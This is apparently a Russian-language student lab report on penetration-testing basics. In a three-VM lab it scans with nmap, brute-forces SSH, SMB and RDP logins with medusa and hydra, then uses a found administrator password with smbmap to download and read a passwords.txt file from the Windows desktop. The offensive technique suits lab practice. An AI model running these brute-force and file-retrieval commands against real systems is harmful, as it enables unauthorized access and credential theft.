---
title: "Основы проведения тестирования на проникновение"
author: Александр Смирнов
format: 
    md:
        output-file: README.md
engine: knitr
---

# Ход выполнения практической работы

## Создание виртуальных машин
Был создан стенд из трёх виртуальных машин. Проверим открытые порты виртуальных машин:

```{bash}
nmap -P 192.168.137.1/24
```

Где CEH-7 - ВМ с Windows7, X55LJ - ВМ с Kali Linux, Mikrotik - роутер с RouterOS.

## Атака Bruteforce

### На роутер Mikrotik
```{bash}
medusa -M ssh -U users.txt -P pass.txt -h 192.168.137.106 | grep 'ACCOUNT FOUND'
```

### На ОС Windows

#### SMB
```{bash}
medusa -M smbnt -U users.txt -P pass.txt -h 192.168.137.4 | grep 'ACCOUNT FOUND'
```

#### RDP
```{bash}
hydra -L users.txt -P pass.txt rdp://192.168.137.4
```

## Использование SMBMAP
 
Проверим права:

```{bash}
smbmap -u Administrator -p qwerty1505 -d workgroup -H 192.168.137.4
```

Проверим содержимое рабочего стола:

```{bash}
smbmap -u Administrator -p qwerty1505 -d workgroup -H 192.168.137.4 -r 'C$\Users\Administrator\Desktop'
```

Получим интересующий нас файл:

```{bash}
smbmap -u Administrator -p qwerty1505 -d workgroup -H 192.168.137.4 -r  --download 'C$\Users\Administrator\Desktop\passwords.txt'
```

Прочитаем содержимое файла:

```{bash}
cat 192.168.137.4-C_Users_Administrator_Desktop_passwords.txt 
```